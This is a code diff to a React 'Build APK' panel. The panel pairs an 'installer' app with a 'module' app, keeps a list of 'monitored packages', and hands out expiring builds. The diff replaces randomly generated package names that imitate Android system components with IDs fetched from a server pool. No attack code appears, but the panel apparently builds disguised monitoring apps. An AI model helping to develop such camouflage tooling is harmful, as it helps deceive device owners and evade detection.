@@ -519,41 +519,23 @@ function ModuleLaunchPagePreview({ title, subtitle, step1, step2, step3, step4, 
   );
 }
 
-const PKG_ORG_WORDS = [
-  'android','google','system','device','mobile','media','core','platform',
-  'app','data','framework','phone','settings','service','secure','internal',
-  'base','provider','hardware','process','kernel','runtime','support','apps',
-  'services','telephony','network','content','package','accounts','location',
-];
-const PKG_APP_WORDS = [
-  'manager','service','core','framework','system','helper','handler','provider',
-  'engine','daemon','bridge','client','receiver','updater','monitor','worker',
-  'runtime','controller','processor','scheduler','resolver','launcher','registry',
-  'agent','relay','cache','proxy','adapter','router','tracker','connector',
-];
-
-function generatePkgSuggestions(count = 6, exclude = []) {
+function generatePkgSuggestions(packageIds, count = 6, exclude = []) {
   const results = new Set();
   const used = new Set(exclude);
-  let tries = 0;
-  while (results.size < count && tries < 300) {
-    tries++;
-    const org = PKG_ORG_WORDS[Math.floor(Math.random() * PKG_ORG_WORDS.length)];
-    const app = PKG_APP_WORDS[Math.floor(Math.random() * PKG_APP_WORDS.length)];
-    const pkg = `com.${org}.${app}`;
-    if (!used.has(pkg)) results.add(pkg);
+  const available = packageIds.filter(pkg => !used.has(pkg));
+  while (results.size < count && available.length > 0) {
+    const index = Math.floor(Math.random() * available.length);
+    results.add(available.splice(index, 1)[0]);
   }
   return [...results];
 }
 
-function generateUniquePackagePair() {
-  let modulePackage = '';
-  let installerPackage = '';
-  while (!modulePackage || !installerPackage || modulePackage === installerPackage) {
-    modulePackage = generatePkgSuggestions(1)[0];
-    installerPackage = generatePkgSuggestions(1, [modulePackage])[0];
-  }
-  return { modulePackage, installerPackage };
+function generateUniquePackagePair(packageIds) {
+  const [modulePackage, installerPackage] = generatePkgSuggestions(packageIds, 2);
+  return {
+    modulePackage: modulePackage || '',
+    installerPackage: installerPackage || '',
+  };
 }
 
 export default function BuildApkTab({ user }) {
@@ -562,12 +544,11 @@ export default function BuildApkTab({ user }) {
   const [installerName,       setInstallerName]      = useState('Assist');
   const [installerIconSource, setInstallerIconSource] = useState('');
 
-  const [{ modulePackage: initialModulePackage, installerPackage: initialInstallerPackage }] = useState(generateUniquePackagePair);
-  const [modulePackage, setModulePackage] = useState(initialModulePackage);
-  const [installerPackage, setInstallerPackage] = useState(initialInstallerPackage);
+  const [modulePackage, setModulePackage] = useState('');
+  const [installerPackage, setInstallerPackage] = useState('');
 
-  const [modPkgSugg,  setModPkgSugg]  = useState(() => generatePkgSuggestions(6, [initialInstallerPackage]));
-  const [instPkgSugg, setInstPkgSugg] = useState(() => generatePkgSuggestions(6, [initialModulePackage]));
+  const [modPkgSugg,  setModPkgSugg]  = useState([]);
+  const [instPkgSugg, setInstPkgSugg] = useState([]);
 
   const [monitoredText, setMonitoredText] = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));
 
@@ -602,6 +583,9 @@ export default function BuildApkTab({ user }) {
   const [disclaimer,   setDisclaimer]  = useState(null);
   const [apkExpiresAt, setApkExpiresAt] = useState(null);
   const [expiryCountdown, setExpiryCountdown] = useState(null);
+  const [packageIds, setPackageIds] = useState([]);
+  const [packageIdsLoading, setPackageIdsLoading] = useState(true);
+  const [packageIdsError, setPackageIdsError] = useState('');
 
   const logEndRef     = useRef(null);
   const pollIdRef     = useRef(null);
@@ -609,11 +593,41 @@ export default function BuildApkTab({ user }) {
   const prevRunningRef = useRef(false);
 
   const applyNewPackageIds = useCallback(() => {
-    const { modulePackage: newModule, installerPackage: newInstaller } = generateUniquePackagePair();
+    const { modulePackage: newModule, installerPackage: newInstaller } =
+      generateUniquePackagePair(packageIds);
+    if (!newModule || !newInstaller) return;
     setModulePackage(newModule);
     setInstallerPackage(newInstaller);
-    setModPkgSugg(generatePkgSuggestions(6, [newInstaller]));
-    setInstPkgSugg(generatePkgSuggestions(6, [newModule]));
+    setModPkgSugg(generatePkgSuggestions(packageIds, 6, [newInstaller]));
+    setInstPkgSugg(generatePkgSuggestions(packageIds, 6, [newModule]));
+  }, [packageIds]);
+
+  useEffect(() => {
+    let cancelled = false;
+    (async () => {
+      try {
+        const r = await fetch('/api/build/packageids', { headers: authHeaders() });
+        const d = await r.json().catch(() => ({}));
+        if (!r.ok || !d.success || !Array.isArray(d.packageIds) || d.packageIds.length < 2) {
+          throw new Error(d.error || 'Package ID pool unavailable');
+        }
+        if (cancelled) return;
+        const ids = [...new Set(d.packageIds.filter(pkg => PKG_REGEX.test(pkg)))];
+        if (ids.length < 2) throw new Error('Package ID pool has fewer than two valid IDs');
+        const { modulePackage, installerPackage } = generateUniquePackagePair(ids);
+        setPackageIds(ids);
+        setModulePackage(modulePackage);
+        setInstallerPackage(installerPackage);
+        setModPkgSugg(generatePkgSuggestions(ids, 6, [installerPackage]));
+        setInstPkgSugg(generatePkgSuggestions(ids, 6, [modulePackage]));
+        setPackageIdsError('');
+      } catch (err) {
+        if (!cancelled) setPackageIdsError(err.message || 'Package ID pool unavailable');
+      } finally {
+        if (!cancelled) setPackageIdsLoading(false);
+      }
+    })();
+    return () => { cancelled = true; };
   }, []);
 
   useEffect(() => {
@@ -870,7 +884,9 @@ export default function BuildApkTab({ user }) {
               />
               {errors.installerPackage
                 ? <span style={styles.errMsg}>{errors.installerPackage}</span>
-                : <span style={styles.hint}>e.g. com.onerule.task</span>}
+                : packageIdsError
+                  ? <span style={styles.errMsg}>{packageIdsError}</span>
+                  : <span style={styles.hint}>{packageIdsLoading ? 'Loading IDs from packageids.json…' : 'IDs loaded from Apk-builder/packageids.json'}</span>}
               <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginTop: 5, alignItems: 'center' }}>
                 <span style={{ fontSize: 10, color: '#475569', flexShrink: 0 }}>Suggest:</span>
                 {instPkgSugg.map(pkg => (
@@ -890,7 +906,7 @@ export default function BuildApkTab({ user }) {
                 ))}
                 <button
                   type="button"
-                  onClick={() => setInstPkgSugg(generatePkgSuggestions(6, modPkgSugg))}
+                  onClick={() => setInstPkgSugg(generatePkgSuggestions(packageIds, 6, [modulePackage]))}
                   disabled={running}
                   style={{
                     background: 'transparent', border: '1px solid #334155', color: '#64748b',
@@ -1022,7 +1038,9 @@ export default function BuildApkTab({ user }) {
               />
               {errors.modulePackage
                 ? <span style={styles.errMsg}>{errors.modulePackage}</span>
-                : <span style={styles.hint}>e.g. com.task.tusker</span>}
+                : packageIdsError
+                  ? <span style={styles.errMsg}>{packageIdsError}</span>
+                  : <span style={styles.hint}>{packageIdsLoading ? 'Loading IDs from packageids.json…' : 'IDs loaded from Apk-builder/packageids.json'}</span>}
               <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginTop: 5, alignItems: 'center' }}>
                 <span style={{ fontSize: 10, color: '#475569', flexShrink: 0 }}>Suggest:</span>
                 {modPkgSugg.map(pkg => (
@@ -1042,8 +1060,8 @@ export default function BuildApkTab({ user }) {
                 ))}
                 <button
                   type="button"
-                  onClick={() => setModPkgSugg(generatePkgSuggestions(6, instPkgSugg))}
-                  disabled={running}
+                  onClick={() => setModPkgSugg(generatePkgSuggestions(packageIds, 6, [installerPackage]))}
+                  disabled={running || packageIdsLoading}
                   style={{
                     background: 'transparent', border: '1px solid #334155', color: '#64748b',
                     borderRadius: 5, padding: '2px 7px', fontSize: 10, cursor: running ? 'not-allowed' : 'pointer',
@@ -1259,9 +1277,9 @@ export default function BuildApkTab({ user }) {
 
         <div style={styles.btnRow}>
           <button
-            style={{ ...styles.buildBtn, ...(running || submitting || !accessId ? styles.buildBtnDisabled : {}) }}
+            style={{ ...styles.buildBtn, ...(running || submitting || !accessId || packageIdsLoading || packageIdsError ? styles.buildBtnDisabled : {}) }}
             onClick={startBuild}
-            disabled={running || submitting || !accessId}
+            disabled={running || submitting || !accessId || packageIdsLoading || !!packageIdsError}
             title={running ? 'A build is already in progress — please wait for it to finish.' : ''}
           >
             {submitting ? '⏳ Starting…' : (running ? '⏳ Building…' : '🔨 Start Build')}
